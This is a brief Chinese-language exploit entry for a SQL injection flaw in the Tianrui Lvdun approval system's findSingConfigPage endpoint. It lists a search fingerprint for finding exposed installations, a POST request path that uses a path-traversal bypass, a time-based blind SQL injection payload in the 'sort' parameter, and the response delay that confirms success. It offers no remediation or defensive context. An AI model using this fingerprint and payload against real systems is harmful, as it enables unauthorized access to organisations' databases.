# 天锐绿盾审批系统findSingConfigPage存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/thirdSystemConfig/findSingConfigPage.do HTTP/1.1`

**Payload**
```
sort=app_id%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(5)))UPad)
```
- **响应特征**：200 响应时间>=5s